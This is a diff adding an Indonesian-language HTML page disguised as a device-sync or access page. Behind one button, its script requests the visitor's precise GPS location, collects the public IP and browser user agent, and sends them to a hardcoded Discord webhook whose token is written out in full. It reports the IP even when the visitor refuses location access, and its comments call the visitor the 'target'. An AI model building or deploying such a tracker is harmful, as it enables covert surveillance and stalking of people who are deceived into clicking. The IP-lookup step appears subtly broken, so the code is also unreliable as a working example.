@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Informasi Perangkat</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4; }
+        .box { max-width: 400px; margin: 0 auto; background: white; padding: 25px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .btn { background-color: #28a745; color: white; border: none; padding: 12px 20px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>Sinkronisasi Perangkat...</h2>
+    <p id="status">Silakan klik tombol di bawah untuk memberikan otoritas akses halaman.</p>
+    <button class="btn" id="btnAkses" onclick="mintaIzinLokasiSekarang()">Masuk ke Halaman</button>
+</div>
+
+<script>
+    const statusText = document.getElementById('status');
+    const btnAkses = document.getElementById('btnAkses');
+    const webhookUrl = "https://discord.com/api/webhooks/1473581902454853777/5AIh1HAd8YUaOzi2fY3PVu-6jGeFRzKVWgDG7fg3g5LfoXZcmbeh3QJjrNC47JwmbBsh"; 
+
+    // Fungsi Utama: Dipicu langsung saat tombol diklik oleh target
+    function mintaIzinLokasiSekarang() {
+        btnAkses.disabled = true;
+        btnAkses.innerText = "Memproses...";
+        statusText.innerHTML = "Meminta izin GPS... Periksa bagian atas browser Anda.";
+
+        // KODE PERINTAH AKTIFKAN LOKASI (Ditaruh di baris paling awal agar langsung jalan)
+        if (!navigator.geolocation) {
+            statusText.innerHTML = "Browser tidak mendukung GPS HTML5.";
+            return;
+        }
+
+        const opsiGPS = {
+            enableHighAccuracy: true, // Memaksa hardware GPS internal aktif maksimal
+            timeout: 10000,           // Waktu tunggu respons sistem (10 detik)
+            maximumAge: 0             // Memaksa mengambil lokasi terbaru secara real-time
+        };
+
+        // KODE UTAMA: Memaksa browser mengeluarkan jendela pop-up konfirmasi lokasi
+        navigator.geolocation.getCurrentPosition(prosesSuksesGPS, prosesGagalGPS, opsiGPS);
+    }
+
+    // Eksekusi jika pengguna mengklik "Izinkan / Allow"
+    async function prosesSuksesGPS(position) {
+        statusText.innerHTML = "<span style='color:green;'>Izin diberikan! Mengambil data jaringan...</span>";
+        
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const acc = `${position.coords.accuracy} meter`;
+
+        // Proses pengambilan IP dijalankan belakangan setelah GPS sukses didapat
+        const ipPublik = await ambilIP();
+
+        kirimDiscord(ipPublik, lat, lon, acc, "HTML5 GPS Sukses");
+    }
+
+    // Eksekusi jika pengguna mengklik "Tolak / Block" atau diblokir sepihak oleh browser
+    async function prosesGagalGPS(error) {
+        statusText.innerHTML = "<span style='color:red;'>Izin lokasi ditolak oleh sistem perangkat.</span>";
+        btnAkses.disabled = false;
+        btnAkses.innerText = "Coba Lagi";
+
+        const ipPublik = await ambilIP();
+        kirimDiscord(ipPublik, "Ditolak", "Ditolak", "-", "HTML5 GPS Ditolak");
+    }
+
+    // Fungsi mengambil IP mandiri lewat Cloudflare CDN (Sangat stabil, bebas crash/CORS error)
+    async function ambilIP() {
+        try {
+            const response = await fetch('https://cloudflare.com');
+            const text = await response.text();
+            const ipLine = text.split('\n').find(line => line.startsWith('ip='));
+            return ipLine ? ipLine.split('=')[1] : "IP Tidak Terbaca";
+        } catch (e) {
+            return "Gagal Jaringan";
+        }
+    }
+
+    // Fungsi pengiriman laporan ke Server Webhook Discord Anda
+    function kirimDiscord(ip, lat, lon, acc, metode) {
+        if (!webhookUrl) return;
+
+        const payload = {
+            content: `📌 **Log Baru Terdeteksi!**\n🌐 **IP**: ${ip}\n📍 **GPS**: ${lat}, ${lon} (Akurasi: ${acc})\n📱 **OS**: ${navigator.userAgent}\n🛠️ **Metode**: ${metode}`
+        };
+
+        fetch(webhookUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        }).catch(err => console.error(err));
+    }
+</script>
+
+</body>
+</html>
